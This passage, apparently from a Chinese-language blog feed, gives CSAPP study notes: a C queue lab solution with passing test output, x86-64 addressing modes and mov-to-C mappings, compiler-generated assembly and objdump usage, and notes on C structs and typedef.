class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@brief</span> Attempts to insert an element at head of a queue</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This function explicitly allocates space to create a copy of `s`.</span><br><span class="hljs-comment"> * The inserted element points to a copy of `s`, instead of `s` itself.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>[in] q The queue to insert into</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>[in] s String to be copied and inserted into the queue</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> true if insertion was successful</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> false if q is NULL, or memory allocation failed</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">bool</span> queue_insert_head(queue_t *q, <span class="hljs-keyword">const</span> char *s) &#123;<br><br>    <span class="hljs-comment">/* What should you do if the q is NULL? */</span><br>    <span class="hljs-keyword">if</span> (q == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    list_ele_t *newh = (list_ele_t *)malloc(sizeof(list_ele_t));<br>    <span class="hljs-keyword">if</span> (newh == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">/* Don&#x27;t forget to allocate space for the string and copy it */</span><br>    newh-&gt;value = (char *)malloc(sizeof(char) * (strlen(s) + <span class="hljs-number">1</span>));<br>    newh-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">/* What if either call to malloc returns NULL? */</span><br>    <span class="hljs-keyword">if</span> (newh-&gt;value == <span class="hljs-literal">NULL</span>) &#123;<br>        free(newh); <span class="hljs-comment">// this is important</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    strcpy(newh-&gt;value, s);<br>    <span class="hljs-comment">// insert</span><br>    <span class="hljs-keyword">if</span> (q-&gt;head == <span class="hljs-literal">NULL</span>) <span class="hljs-comment">// what if q-&gt;head ==NULL?</span><br>    &#123;<br>        q-&gt;head = newh;<br>        q-&gt;tail = newh;<br>        q-&gt;size++;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        newh-&gt;next = q-&gt;head;<br>        q-&gt;head = newh;<br>        q-&gt;size++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="queue-remove-head"><a href="#queue-remove-head" class="headerlink" title="queue_remove_head"></a>queue_remove_head</h1><ul><li>将队列头结点删去，同时要使用strncpy将节点中的字符串复制保存下来</li><li>注意strncpy的用法，可以参考c++reference，字符串末尾要手动加\0</li><li>要同时free节点和节点内指向char的指针<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@brief</span> Attempts to remove an element from head of a queue</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If removal succeeds, this function frees all memory used by the</span><br><span class="hljs-comment"> * removed list element and its string value before returning.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If removal succeeds and `buf` is non-NULL, this function copies up to</span><br><span class="hljs-comment"> * `bufsize - 1` characters from the removed string into `buf`, and writes</span><br><span class="hljs-comment"> * a null terminator &#x27;\0&#x27; after the copied string.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>[in]  q       The queue to remove from</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>[out] buf     Output buffer to write a string value into</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>[in]  bufsize Size of the buffer `buf` points to</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> true if removal succeeded</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> false if q is NULL or empty</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">bool</span> queue_remove_head(queue_t *q, char *buf, size_t bufsize) &#123;<br>    <span class="hljs-comment">/* You need to fix up this code. */</span><br>    <span class="hljs-keyword">if</span> (q == <span class="hljs-literal">NULL</span> || q-&gt;size == <span class="hljs-number">0</span> || buf == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    strncpy(buf, q-&gt;head-&gt;value, bufsize - <span class="hljs-number">1</span>); <span class="hljs-comment">// max bufsize-1 bytes copied</span><br>    buf[bufsize - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    list_ele_t *temp = q-&gt;head;<br>    <span class="hljs-keyword">if</span> (q-&gt;size == <span class="hljs-number">1</span>) &#123;<br>        q-&gt;size--;<br>        q-&gt;head = <span class="hljs-literal">NULL</span>;<br>        q-&gt;tail = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">if</span> (temp-&gt;value != <span class="hljs-literal">NULL</span>)<br>            free(temp-&gt;value);<br>        free(temp);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        q-&gt;size--;<br>        q-&gt;head = q-&gt;head-&gt;next;<br>        <span class="hljs-keyword">if</span> (temp-&gt;value != <span class="hljs-literal">NULL</span>)<br>            free(temp-&gt;value);<br>        free(temp);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="queue-size"><a href="#queue-size" class="headerlink" title="queue_size"></a>queue_size</h1><ul><li>要注意到返回值是size_t类型，所以要进行一次强制类型转换<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief Returns the number of elements in a queue</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This function runs in O(1) time.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @param[in] q The queue to examine</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @return the number of elements in the queue, or</span><br><span class="hljs-comment"> *         0 if q is NULL or empty</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">size_t</span> <span class="hljs-title">queue_size</span><span class="hljs-params">(<span class="hljs-keyword">queue_t</span> *q)</span> </span>&#123;<br>    <span class="hljs-comment">/* You need to write the code for this function */</span><br>    <span class="hljs-comment">/* Remember: It should operate in O(1) time */</span><br>    <span class="hljs-keyword">if</span> (q != <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)q-&gt;size;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)<span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="queue-reverse"><a href="#queue-reverse" class="headerlink" title="queue_reverse"></a>queue_reverse</h1></li><li>使用三个指针，pre指针和iter指针用来改变节点的指向，next指针一直往后移动且试探是否下一个节点为null</li><li>绿色为被改变的节点指针的指向</li><li>红色表示每次循环这三个指针都要往后指</li><li>最后，队列的首位指针要调换</li></ul><p><img src="/image/csapp/Snipaste_2022-08-31_21-37-25.png"></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief Reverse the elements in a queue</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This function does not allocate or free any list elements, i.e. it does</span><br><span class="hljs-comment"> * not call malloc or free, including inside helper functions. Instead, it</span><br><span class="hljs-comment"> * rearranges the existing elements of the queue.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @param[in] q The queue to reverse</span><br><span class="hljs-comment"> */</span><br>void queue_reverse(queue_t *q) &#123;<br>    <span class="hljs-function"><span class="hljs-title">if</span> (q == NULL || q-&gt;</span>head == NULL) &#123;<br>        return;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-title">list_ele_t</span> *iter = q-&gt;</span>head;<br>    <span class="hljs-function"><span class="hljs-title">list_ele_t</span> *next = q-&gt;</span><span class="hljs-function"><span class="hljs-title">head</span>-&gt;</span>next;<br>    list_ele_t *prev = NULL;<br>    <span class="hljs-keyword">while</span> (next) &#123;<br>        <span class="hljs-function"><span class="hljs-title">iter</span>-&gt;</span>next = prev;<br>        prev = iter;<br>        iter = next;<br>        <span class="hljs-function"><span class="hljs-title">next</span> = next-&gt;</span>next;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-title">iter</span>-&gt;</span>next = prev;<br>    <span class="hljs-function"><span class="hljs-title">q</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">tail</span> = q-&gt;</span>head;<br>    <span class="hljs-function"><span class="hljs-title">q</span>-&gt;</span>head = iter;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="测评"><a href="#测评" class="headerlink" title="测评"></a>测评</h1><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">make</span> clean<br><br><span class="hljs-built_in">make</span> <span class="hljs-keyword">format</span><br><br>./driver.py<br><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">...</span><span class="hljs-params">(略)</span><br><br>+++ TESTING trace trace-15-perf:<br><span class="hljs-string">./qtest</span> -v 1 -f <span class="hljs-string">./traces/trace-15-perf.cmd</span><br><span class="hljs-comment"># Test performance of insert_tail, size, and reverse</span><br><span class="hljs-params">---</span>     trace-15-perf   7/7<br><span class="hljs-params">---</span>     TOTAL           100/100<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP：程序的机器级表示-2</title>
    <link href="/p/de374fbf/"/>
    <url>/p/de374fbf/</url>
    
    <content type="html"><![CDATA[<h1 id="程序员视角"><a href="#程序员视角" class="headerlink" title="程序员视角"></a>程序员视角</h1><ul><li>程序计数器(Program counter，PC )<ul><li>CS：IP</li><li>EIP</li><li>RIP</li></ul></li><li>寄存器（Register）</li><li>条件码(Condition codes)<ul><li>存储最近的算术或逻辑运算的状态信息</li><li>用于条件分支</li></ul></li><li>内存(Memory)<ul><li>可按字节寻址的数组（内存就是个大数组）</li><li>程序和数据</li><li>栈(Stack，用于函数调用过程的实现)</li></ul></li></ul><h1 id="几种常见的寻址方式"><a href="#几种常见的寻址方式" class="headerlink" title="几种常见的寻址方式"></a>几种常见的寻址方式</h1><h2 id="寄存器间接寻址"><a href="#寄存器间接寻址" class="headerlink" title="寄存器间接寻址"></a>寄存器间接寻址</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs log">movq (%rcx),%rax<br></code></pre></td></tr></table></figure><p>寄存器R指定内存地址</p><ul><li>Mem[Reg[R]]</li><li>(%rax)</li></ul><h2 id="相对寻址"><a href="#相对寻址" class="headerlink" title="相对寻址"></a>相对寻址</h2><figure class="highlight arm"><figcaption><span>Assembly</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ARM"><span class="hljs-symbol">movq</span> <span class="hljs-number">8</span>(%rbp),%rdx<br></code></pre></td></tr></table></figure><ul><li>寄存器R指定内存区域的开始地址，需配合偏移地址</li><li>形式：D(R) 含义：Mem[Reg[R]+D]  D为1/2/4/8</li></ul><h2 id="完整的内存寻址模式"><a href="#完整的内存寻址模式" class="headerlink" title="完整的内存寻址模式"></a>完整的内存寻址模式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs log">Mem[Reg[Rb]+S*Reg[Ri]]<br></code></pre></td></tr></table></figure><ul><li>D(Rb,Ri,S) </li><li>Mem[Reg[Rb]+S*Reg[Ri]+ D]</li></ul><blockquote><p>(Rb,Ri)    Mem[Reg[Rb]+Reg[Ri]]<br>        D(Rb,Ri)    Mem[Reg[Rb]+Reg[Ri]+D]<br>        (Rb,Ri,S)    Mem[Reg[Rb]+S*Reg[Ri]]</p></blockquote><h1 id="mov对应的C语言语句"><a href="#mov对应的C语言语句" class="headerlink" title="mov对应的C语言语句"></a>mov对应的C语言语句</h1><p>movq $0x4,%rax </p><ul><li>temp = 0x4;</li></ul><p>movq $-147,  (%rax)</p><ul><li>*p = -147;</li></ul><p>movq %rax,   %rdx</p><ul><li>temp2 = temp1</li></ul><p>movq %rax,   (%rdx)</p><ul><li>*p = temp;</li></ul><p>movq (%rax), %rdx</p><ul><li>temp = *p;</li></ul><h1 id="swap函数"><a href="#swap函数" class="headerlink" title="swap函数"></a>swap函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span></span><br><span class="hljs-function">   <span class="hljs-params">(<span class="hljs-keyword">long</span> *xp, <span class="hljs-keyword">long</span> *yp)</span> </span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">long</span> t0 = *xp;<br>  <span class="hljs-keyword">long</span> t1 = *yp;<br>  *xp = t1;<br>  *yp = t0;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs log">swap:<br>   movq    (%rdi), %rax  # t0 = *xp  <br>   movq    (%rsi), %rdx  # t1 = *yp<br>   movq    %rdx, (%rdi)  # *xp = t1<br>   movq    %rax, (%rsi)  # *yp = t0<br>   ret<br></code></pre></td></tr></table></figure><h1 id="C语言程序与汇编的转换"><a href="#C语言程序与汇编的转换" class="headerlink" title="C语言程序与汇编的转换"></a>C语言程序与汇编的转换</h1><p>C语言程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">plus</span><span class="hljs-params">(<span class="hljs-keyword">long</span> x, <span class="hljs-keyword">long</span> y)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sumstore</span><span class="hljs-params">(<span class="hljs-keyword">long</span> x, <span class="hljs-keyword">long</span> y, </span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-keyword">long</span> *dest)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">long</span> t = plus(x, y);<br>    *dest = t;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc –Og –S sum.c<br></code></pre></td></tr></table></figure><p>生成的汇编：</p><figure class="highlight mips"><figcaption><span>Assembly</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs MIPS">        .file   <span class="hljs-string">&quot;fk.c&quot;</span><br>        <span class="hljs-meta">.text</span><br>        .globl  sumstore<br>        .type   sumstore, @function<br><span class="hljs-symbol">sumstore:</span><br><span class="hljs-symbol">.LFB0:</span><br>        .cfi_startproc<br>        endbr64<br>        pushq   %rbx<br>        .cfi_def_cfa_offset <span class="hljs-number">16</span><br>        .cfi_offset <span class="hljs-number">3</span>, -<span class="hljs-number">16</span><br>        movq    %rdx, %rbx<br>        call    plus@PLT<br>        movq    %rax, (%rbx)<br>        popq    %rbx<br>        .cfi_def_cfa_offset <span class="hljs-number">8</span><br>        ret<br>        .cfi_endproc<br><span class="hljs-symbol">.LFE0:</span><br>        .size   sumstore, .-sumstore<br>        .ident  <span class="hljs-string">&quot;GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0&quot;</span><br>        <span class="hljs-meta">.section</span>        .note.GNU-stack,<span class="hljs-string">&quot;&quot;</span>,@progbits<br>        <span class="hljs-meta">.section</span>        .note.gnu.property,<span class="hljs-string">&quot;a&quot;</span><br>        <span class="hljs-meta">.align</span> <span class="hljs-number">8</span><br>        <span class="hljs-meta">.long</span>    <span class="hljs-number">1</span>f - <span class="hljs-number">0</span>f<br>        <span class="hljs-meta">.long</span>    <span class="hljs-number">4</span>f - <span class="hljs-number">1</span>f<br>        <span class="hljs-meta">.long</span>    <span class="hljs-number">5</span><br><span class="hljs-number">0</span>:<br>        .string  <span class="hljs-string">&quot;GNU&quot;</span><br><span class="hljs-number">1</span>:<br>        <span class="hljs-meta">.align</span> <span class="hljs-number">8</span><br>        <span class="hljs-meta">.long</span>    <span class="hljs-number">0xc0000002</span><br>        <span class="hljs-meta">.long</span>    <span class="hljs-number">3</span>f - <span class="hljs-number">2</span>f<br><span class="hljs-number">2</span>:<br>        <span class="hljs-meta">.long</span>    <span class="hljs-number">0x3</span><br><span class="hljs-number">3</span>:<br>        <span class="hljs-meta">.align</span> <span class="hljs-number">8</span><br><span class="hljs-number">4</span>:<br></code></pre></td></tr></table></figure><p>精简一下：</p><figure class="highlight mips"><figcaption><span>Assembly</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs MIPS"><span class="hljs-symbol">sumstore:</span><br>   pushq   %rbx<br>   movq    %rdx, %rbx<br>   call    plus<br>   movq    %rax, (%rbx)<br>   popq    %rbx<br>   ret<br></code></pre></td></tr></table></figure><p>可以使用<code>objdump</code>对二进制文件进行反汇编</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gams">objdump<br><br>View information about object <span class="hljs-keyword">files</span>.<br>More information: https:<span class="hljs-comment">//manned.org/objdump.</span><br><br>- <span class="hljs-keyword">Display</span> the <span class="hljs-keyword">file</span> header information:<br>  objdump -f <span class="hljs-keyword">binary</span><br><br>- <span class="hljs-keyword">Display</span> the dis-assembled output of executable sections:<br>  objdump -d <span class="hljs-keyword">binary</span><br><br>- <span class="hljs-keyword">Display</span> a complete <span class="hljs-keyword">binary</span> hex dump of <span class="hljs-keyword">all</span> sections:<br>  objdump -s <span class="hljs-keyword">binary</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统，csapp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言：结构体</title>
    <link href="/p/8cf2e09a/"/>
    <url>/p/8cf2e09a/</url>
    
    <content type="html"><![CDATA[<h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs smali">struct point&#123;<br> <span class="hljs-built_in"> int </span>x;<br> <span class="hljs-built_in"> int </span>y;<br>&#125;p1,p2;<br><br>struct point p3;<br></code></pre></td></tr></table></figure><ul><li>struct 后跟的point称为结构标记，这种标识符在C语言中称为Tag</li><li>struct声明定义了一种数据类型，可以将自定义的标识符声明为指定类型的变量，这里p1,p2都是point类型</li><li>如果在定义结构体类型的同时定义了变量，也可以不必写Tag，但这样就没有办法再次引用这个结构体类型（没有tag）</li></ul><h1 id="成员访问与引用"><a href="#成员访问与引用" class="headerlink" title="成员访问与引用"></a>成员访问与引用</h1><p>通过<code>.</code>进行结构体的引用</p><ul><li><code>struct point maxpt = &#123;320, 200&#125;;</code>，那么maxpt.x可以访问maxpt的x成员，若有结构体内部的嵌套关系，也可以使用<code>.</code>访问被嵌套的成员<br>通过<code>-&gt;</code>进行引用</li><li><code>struct point origin,*pp;</code> 将 pp 定义为一个指向 struct point 类型对象的指针</li><li>pp = &amp;origin，该指针指向origin结构体，然后就可以用<code>(*pp).x, (*pp).y</code>来访问结构体的变量</li><li><code>(*pp).x</code> 中的圆括号是必需的，因为结构成员运算符<code>.</code>的优先级比<code>*</code>的优先级高。表达式<code>*pp.x</code> 的含义等价于*(pp.x)，因为 x 不是指针，所以该表达式是非法的</li></ul><p>C 语言提供了另一种简写方式，假定 p 是一个指向结构的指针，可以用p-&gt;结构成员这种形式引用相应的结构成员</p><p>假设有一个结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_ele</span> &#123;</span><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief Pointer to a char array containing a string value.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * The memory for this string should be explicitly allocated and freed</span><br><span class="hljs-comment">     * whenever an element is inserted and removed from the queue.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">char</span> *value;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief Pointer to the next element in the linked list.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_ele</span> *<span class="hljs-title">next</span>;</span><br>&#125; <span class="hljs-keyword">list_ele_t</span>;<br></code></pre></td></tr></table></figure><ul><li><p><code> list_ele_t *newh = (list_ele_t *)malloc(sizeof(list_ele_t));</code>分配了结构体的空间。但是这样不会给value分配空间</p></li><li><p><code> newh-&gt;value = (char *)malloc(sizeof(char) * (strlen(s) + 1));</code>给结构体内的value分配了空间，这样之后才可以对value进行操作</p></li></ul><h1 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h1><ul><li>结构体类型之间用赋值运算符是允许的</li><li>用一个结构体初始化另一个结构体也是允许的</li><li>将结构体作为函数参数、函数返回值是允许的</li></ul><p>一个函数调用分析</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">struct</span> complex_struct <span class="hljs-title">add_complex</span>(<span class="hljs-params"><span class="hljs-keyword">struct</span> complex_struct z1, <span class="hljs-keyword">struct</span></span></span><br><span class="hljs-params"><span class="hljs-function">complex_struct z2</span>)</span><br>&#123;<br>  z1.x = z1.x + z2.x;<br>  z1.y = z1.y + z2.y;<br>  <span class="hljs-keyword">return</span> z1;<br>&#125;<br><br><span class="hljs-keyword">struct</span> complex_struct z = &#123; <span class="hljs-number">3.0</span>, <span class="hljs-number">4.0</span> &#125;;<br>z = add_complex(z, z);<br></code></pre></td></tr></table></figure><p>变量z在main函数的栈帧中，参数z1和z2在add_complex函数的栈帧中，z的值分别赋给z1和z2</p><p>如果结构体中有char类型的数组，可以使用strcpy函数进行赋值</p><h1 id="类型定义"><a href="#类型定义" class="headerlink" title="类型定义"></a>类型定义</h1><p>typedef可以建立新的数据类型名，例如，<code>typedef int Length;</code>将 Length 定义为与 int 具有同等意义的名字</p><p>比较复杂的类型定义:</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">typedef int <span class="hljs-comment">(*PFI)(char *, char *)</span>;<br></code></pre></td></tr></table></figure><p>该语句定义了类型 PFI 是“一个指向函数的指针，该函数具有两个 char *类型的参数，返回值类型为 int”</p><p>typedef有助于分析函数声明，比如下面的声明，可以暴力分析：</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">void</span> (*<span class="hljs-keyword">signal</span><span class="hljs-string"></span>(<span class="hljs-built_in">int</span> sig, <span class="hljs-keyword">void</span> (*func)(<span class="hljs-built_in">int</span>)))(<span class="hljs-built_in">int</span>);<br></code></pre></td></tr></table></figure><ul><li>简化声明<ul><li><code>void (*signal(int sig, func))(int);</code></li><li><code>void (*)(int);</code></li></ul></li><li>signal 是一个函数<ul><li>有两个参数，一个为int类型，一个为指向函数的指针</li><li>返回值为指向函数的指针（参数为int，返回值为void）</li></ul></li></ul><p>也可以这样分析：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 